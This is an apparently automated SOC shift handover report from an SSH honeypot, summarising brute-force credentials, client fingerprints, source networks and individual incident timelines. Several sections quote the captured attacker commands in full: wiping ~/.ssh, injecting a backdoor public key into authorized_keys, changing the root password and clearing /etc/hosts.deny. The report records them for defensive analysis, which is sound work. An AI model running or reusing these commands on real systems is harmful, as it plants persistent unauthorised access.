# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-23 |
| **Generated At** | 2026-05-23T09:58:14Z |
| **Shift Time** | 09:58 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **151** |
| Confirmed Threats | **133** |
| False Positives Filtered | **18** (11.9%) |
| Unique Attacker IPs | **31** |
| Countries of Origin | **16** |
| High Severity Cases | **52** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **99** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **100** |
| Unique Credential Pairs | **51** |
| Unique Usernames | **23** |
| Unique Passwords | **49** |
| Successful Auth Pairs | **40** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 52 |
| `345gs5662d34` | 24 |
| `ubuntu` | 3 |
| `aroot` | 2 |
| `ali` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 24 |
| `3245gs5662d34` | 24 |
| `12345678` | 3 |
| `ubuntu1234` | 2 |
| `aroot` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `3245gs5662d34` | 24 |
| `root` | `ubuntu1234` | 2 |
| `aroot` | `aroot` | 2 |
| `root` | `Aa@123321` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `qwe@123456` | `180.76.105.165` | 2026-05-23T06:46:22 |
| `root` | `3245gs5662d34` | `180.76.105.165` | 2026-05-23T06:46:34 |
| `root` | `QWERqwer123` | `180.76.105.165` | 2026-05-23T06:46:50 |
| `root` | `Root123456` | `180.76.105.165` | 2026-05-23T06:47:28 |
| `root` | `p0o9i8u7y6t5` | `180.76.105.165` | 2026-05-23T06:48:00 |
| `root` | `Qazxsw123` | `180.93.3.33` | 2026-05-23T07:18:35 |
| `root` | `3245gs5662d34` | `180.93.3.33` | 2026-05-23T07:18:38 |
| `root` | `Admin2025!` | `193.30.14.165` | 2026-05-23T07:19:48 |
| `root` | `3245gs5662d34` | `193.30.14.165` | 2026-05-23T07:19:55 |
| `root` | `ubuntu1234` | `152.32.169.153` | 2026-05-23T07:32:39 |
| `root` | `3245gs5662d34` | `152.32.169.153` | 2026-05-23T07:32:42 |
| `root` | `ubuntu1234` | `105.27.148.94` | 2026-05-23T07:33:07 |
| `root` | `3245gs5662d34` | `105.27.148.94` | 2026-05-23T07:33:12 |
| `root` | `By123456` | `190.220.172.154` | 2026-05-23T08:04:49 |
| `root` | `3245gs5662d34` | `190.220.172.154` | 2026-05-23T08:04:57 |
| `root` | `Yu123456` | `82.152.132.24` | 2026-05-23T08:22:10 |
| `root` | `3245gs5662d34` | `82.152.132.24` | 2026-05-23T08:22:15 |
| `root` | `Aa147258@` | `196.92.7.247` | 2026-05-23T08:29:33 |
| `root` | `3245gs5662d34` | `154.144.225.226` | 2026-05-23T08:29:36 |
| `root` | `Password123@` | `196.92.7.247` | 2026-05-23T08:41:09 |
| `root` | `3245gs5662d34` | `196.92.7.246` | 2026-05-23T08:41:12 |
| `root` | `Abcd123456` | `196.92.7.246` | 2026-05-23T08:44:59 |
| `root` | `3245gs5662d34` | `196.92.7.249` | 2026-05-23T08:45:02 |
| `root` | `123qweQWE` | `196.92.7.247` | 2026-05-23T08:52:31 |
| `root` | `Q1w2e3r4t5` | `196.92.7.249` | 2026-05-23T08:56:14 |
| `root` | `09N1RCa1Hs31` | `154.144.225.226` | 2026-05-23T09:03:50 |
| `root` | `Aa@123321` | `117.72.114.183` | 2026-05-23T09:04:19 |
| `root` | `Aa@123321` | `180.76.170.111` | 2026-05-23T09:10:42 |
| `root` | `@a123456` | `180.76.170.111` | 2026-05-23T09:11:58 |
| `root` | `asdf.1234` | `186.68.83.105` | 2026-05-23T09:18:39 |
| `root` | `3245gs5662d34` | `186.68.83.105` | 2026-05-23T09:18:46 |
| `root` | `1qaz@2WSX` | `186.68.83.105` | 2026-05-23T09:22:17 |
| `root` | `Server2026!` | `186.68.83.105` | 2026-05-23T09:26:02 |
| `root` | `demo@123` | `186.68.83.105` | 2026-05-23T09:33:51 |
| `root` | `Admin2024!@#` | `186.68.83.105` | 2026-05-23T09:37:48 |
| `root` | `!QAZ2wsx2020` | `186.68.83.105` | 2026-05-23T09:49:20 |
| `root` | `12345678` | `118.194.234.8` | 2026-05-23T09:51:31 |
| `root` | `3245gs5662d34` | `118.194.234.8` | 2026-05-23T09:51:33 |
| `root` | `1q2w!Q@W` | `186.68.83.105` | 2026-05-23T09:53:04 |
| `root` | `asdasd12` | `118.194.234.8` | 2026-05-23T09:55:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **151** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 116 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 86 | 16 |
| `03a80b21afa8...` | Modern SSH client | 26 | 2 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 86 | 16 | Mirai/variant |
| `03a80b21afa8...` | libssh | 26 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 3 | — |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 3 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 24 | 13 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ZfHmxhG7u7Wd"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.76.105.165`, `180.76.170.111`, `117.72.114.183`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `105.27.148.94`, `180.93.3.33`, `196.92.7.249`, `193.30.14.165`, `196.92.7.247`, `152.32.169.153`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **31** |
| Unique ASNs | **23** |
| High-Risk ASNs | **18** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS6713` | Office National des Postes et Telecommunications ONPT (Maroc Telecom) / IAM | 4 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS25369` | Hydra Communications Ltd | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 2 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS8452` | TE-AS | 1 | MEDIUM |
| `AS7679` | QTnet,Inc. | 1 | MEDIUM |
| `AS7602` | Sai gon Postel Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (52)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-c5ab8439230c

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]165` |
| **First Seen** | 2026-05-23 06:46 |
| **Last Seen** | 2026-05-23 06:46 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 06:46:19` | `cowrie.session.connect` |
| `2026-05-23 06:46:19` | `cowrie.client.version` |
| `2026-05-23 06:46:21` | `cowrie.client.kex` |
| `2026-05-23 06:46:22` | `cowrie.login.success` |
| `2026-05-23 06:46:23` | `cowrie.session.params` |
| `2026-05-23 06:46:23` | `cowrie.command.input` |
| `2026-05-23 06:46:23` | `cowrie.command.failed` |
| `2026-05-23 06:46:23` | `cowrie.log.closed` |
| `2026-05-23 06:46:26` | `cowrie.session.params` |
| `2026-05-23 06:46:26` | `cowrie.command.input` |
| `2026-05-23 06:46:27` | `cowrie.session.file_download` |
| `2026-05-23 06:46:27` | `cowrie.log.closed` |
| `2026-05-23 06:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]165` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95b3833be6c0

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]165` |
| **First Seen** | 2026-05-23 06:46 |
| **Last Seen** | 2026-05-23 06:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 06:46:31` | `cowrie.session.connect` |
| `2026-05-23 06:46:31` | `cowrie.client.version` |
| `2026-05-23 06:46:32` | `cowrie.client.kex` |
| `2026-05-23 06:46:34` | `cowrie.login.success` |
| `2026-05-23 06:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]165` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d0ad9df850b

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]165` |
| **First Seen** | 2026-05-23 06:46 |
| **Last Seen** | 2026-05-23 06:47 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 06:46:49` | `cowrie.session.connect` |
| `2026-05-23 06:46:49` | `cowrie.client.version` |
| `2026-05-23 06:46:49` | `cowrie.client.kex` |
| `2026-05-23 06:46:50` | `cowrie.login.success` |
| `2026-05-23 06:46:52` | `cowrie.session.params` |
| `2026-05-23 06:46:52` | `cowrie.command.input` |
| `2026-05-23 06:46:52` | `cowrie.command.failed` |
| `2026-05-23 06:46:52` | `cowrie.log.closed` |
| `2026-05-23 06:46:54` | `cowrie.session.params` |
| `2026-05-23 06:46:54` | `cowrie.command.input` |
| `2026-05-23 06:46:54` | `cowrie.session.file_download` |
| `2026-05-23 06:46:54` | `cowrie.log.closed` |
| `2026-05-23 06:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]165` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a43be0acd918

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]165` |
| **First Seen** | 2026-05-23 06:47 |
| **Last Seen** | 2026-05-23 06:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 06:47:04` | `cowrie.session.connect` |
| `2026-05-23 06:47:04` | `cowrie.client.version` |
| `2026-05-23 06:47:04` | `cowrie.client.kex` |
| `2026-05-23 06:47:07` | `cowrie.login.success` |
| `2026-05-23 06:47:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]165` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-541c8bb274c0

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]165` |
| **First Seen** | 2026-05-23 06:47 |
| **Last Seen** | 2026-05-23 06:47 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 06:47:23` | `cowrie.session.connect` |
| `2026-05-23 06:47:23` | `cowrie.client.version` |
| `2026-05-23 06:47:23` | `cowrie.client.kex` |
| `2026-05-23 06:47:28` | `cowrie.login.success` |
| `2026-05-23 06:47:29` | `cowrie.session.params` |
| `2026-05-23 06:47:29` | `cowrie.command.input` |
| `2026-05-23 06:47:29` | `cowrie.command.failed` |
| `2026-05-23 06:47:29` | `cowrie.log.closed` |
| `2026-05-23 06:47:30` | `cowrie.session.params` |
| `2026-05-23 06:47:30` | `cowrie.command.input` |
| `2026-05-23 06:47:30` | `cowrie.session.file_download` |
| `2026-05-23 06:47:30` | `cowrie.log.closed` |
| `2026-05-23 06:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]165` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-751dd8cbfb75

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]165` |
| **First Seen** | 2026-05-23 06:47 |
| **Last Seen** | 2026-05-23 06:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 06:47:37` | `cowrie.session.connect` |
| `2026-05-23 06:47:37` | `cowrie.client.version` |
| `2026-05-23 06:47:37` | `cowrie.client.kex` |
| `2026-05-23 06:47:44` | `cowrie.login.success` |
| `2026-05-23 06:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]165` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33d2adcc84d7

| Field | Detail |
|---|---|
| **Source IP** | `180.76.105[.]165` |
| **First Seen** | 2026-05-23 06:47 |
| **Last Seen** | 2026-05-23 06:49 |
| **Session Duration** | 61s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:ZfHmxhG7u7Wd"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 06:47:59` | `cowrie.session.connect` |
| `2026-05-23 06:47:59` | `cowrie.client.version` |
| `2026-05-23 06:47:59` | `cowrie.client.kex` |
| `2026-05-23 06:48:00` | `cowrie.login.success` |
| `2026-05-23 06:48:01` | `cowrie.session.params` |
| `2026-05-23 06:48:01` | `cowrie.command.input` |
| `2026-05-23 06:48:01` | `cowrie.command.failed` |
| `2026-05-23 06:48:05` | `cowrie.log.closed` |
| `2026-05-23 06:48:07` | `cowrie.session.params` |
| `2026-05-23 06:48:07` | `cowrie.command.input` |
| `2026-05-23 06:48:07` | `cowrie.session.file_download` |
| `2026-05-23 06:48:07` | `cowrie.log.closed` |
| `2026-05-23 06:48:21` | `cowrie.session.params` |
| `2026-05-23 06:48:21` | `cowrie.command.input` |
| `2026-05-23 06:48:21` | `cowrie.log.closed` |
| `2026-05-23 06:48:25` | `cowrie.session.params` |
| `2026-05-23 06:48:25` | `cowrie.command.input` |
| `2026-05-23 06:48:25` | `cowrie.log.closed` |
| `2026-05-23 06:48:26` | `cowrie.session.params` |
| `2026-05-23 06:48:26` | `cowrie.command.input` |
| `2026-05-23 06:48:27` | `cowrie.session.file_download` |
| `2026-05-23 06:48:27` | `cowrie.log.closed` |
| `2026-05-23 06:48:27` | `cowrie.session.params` |
| `2026-05-23 06:48:27` | `cowrie.command.input` |
| `2026-05-23 06:48:28` | `cowrie.log.closed` |
| `2026-05-23 06:48:31` | `cowrie.session.params` |
| `2026-05-23 06:48:31` | `cowrie.command.input` |
| `2026-05-23 06:48:31` | `cowrie.log.closed` |
| `2026-05-23 06:48:34` | `cowrie.session.params` |
| `2026-05-23 06:48:34` | `cowrie.command.input` |
| `2026-05-23 06:48:34` | `cowrie.command.input` |
| `2026-05-23 06:48:35` | `cowrie.log.closed` |
| `2026-05-23 06:48:35` | `cowrie.session.params` |
| `2026-05-23 06:48:35` | `cowrie.command.input` |
| `2026-05-23 06:48:35` | `cowrie.log.closed` |
| `2026-05-23 06:48:38` | `cowrie.session.params` |
| `2026-05-23 06:48:38` | `cowrie.command.input` |
| `2026-05-23 06:48:39` | `cowrie.log.closed` |
| `2026-05-23 06:48:42` | `cowrie.session.params` |
| `2026-05-23 06:48:42` | `cowrie.command.input` |
| `2026-05-23 06:48:42` | `cowrie.log.closed` |
| `2026-05-23 06:48:44` | `cowrie.session.params` |
| `2026-05-23 06:48:44` | `cowrie.command.input` |
| `2026-05-23 06:48:45` | `cowrie.log.closed` |
| `2026-05-23 06:48:45` | `cowrie.session.params` |
| `2026-05-23 06:48:46` | `cowrie.command.input` |
| `2026-05-23 06:48:46` | `cowrie.log.closed` |
| `2026-05-23 06:48:48` | `cowrie.session.params` |
| `2026-05-23 06:48:48` | `cowrie.command.input` |
| `2026-05-23 06:48:48` | `cowrie.log.closed` |
| `2026-05-23 06:48:49` | `cowrie.session.params` |
| `2026-05-23 06:48:49` | `cowrie.command.input` |
| `2026-05-23 06:48:49` | `cowrie.log.closed` |
| `2026-05-23 06:48:51` | `cowrie.session.params` |
| `2026-05-23 06:48:51` | `cowrie.command.input` |
| `2026-05-23 06:48:51` | `cowrie.log.closed` |
| `2026-05-23 06:48:52` | `cowrie.session.params` |
| `2026-05-23 06:48:52` | `cowrie.command.input` |
| `2026-05-23 06:48:58` | `cowrie.log.closed` |
| `2026-05-23 06:49:00` | `cowrie.session.params` |
| `2026-05-23 06:49:00` | `cowrie.command.input` |
| `2026-05-23 06:49:00` | `cowrie.log.closed` |
| `2026-05-23 06:49:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.105[.]165` to AbuseIPDB if not already reported
- [ ] Block `180.76.105[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6572c76d90be

| Field | Detail |
|---|---|
| **Source IP** | `180.93.3[.]33` |
| **First Seen** | 2026-05-23 07:18 |
| **Last Seen** | 2026-05-23 07:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 07:18:34` | `cowrie.session.connect` |
| `2026-05-23 07:18:34` | `cowrie.client.version` |
| `2026-05-23 07:18:34` | `cowrie.client.kex` |
| `2026-05-23 07:18:35` | `cowrie.login.success` |
| `2026-05-23 07:18:35` | `cowrie.session.params` |
| `2026-05-23 07:18:35` | `cowrie.command.input` |
| `2026-05-23 07:18:35` | `cowrie.command.failed` |
| `2026-05-23 07:18:35` | `cowrie.log.closed` |
| `2026-05-23 07:18:35` | `cowrie.session.params` |
| `2026-05-23 07:18:35` | `cowrie.command.input` |
| `2026-05-23 07:18:36` | `cowrie.session.file_download` |
| `2026-05-23 07:18:36` | `cowrie.log.closed` |
| `2026-05-23 07:18:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.93.3[.]33` to AbuseIPDB if not already reported
- [ ] Block `180.93.3[.]33` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6cb4b17e75a

| Field | Detail |
|---|---|
| **Source IP** | `180.93.3[.]33` |
| **First Seen** | 2026-05-23 07:18 |
| **Last Seen** | 2026-05-23 07:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-23 07:18:37` | `cowrie.session.connect` |
| `2026-05-23 07:18:37` | `cowrie.client.version` |
| `2026-05-23 07:18:37` | `cowrie.client.kex` |
| `2026-05-23 07:18:38` | `cowrie.login.success` |
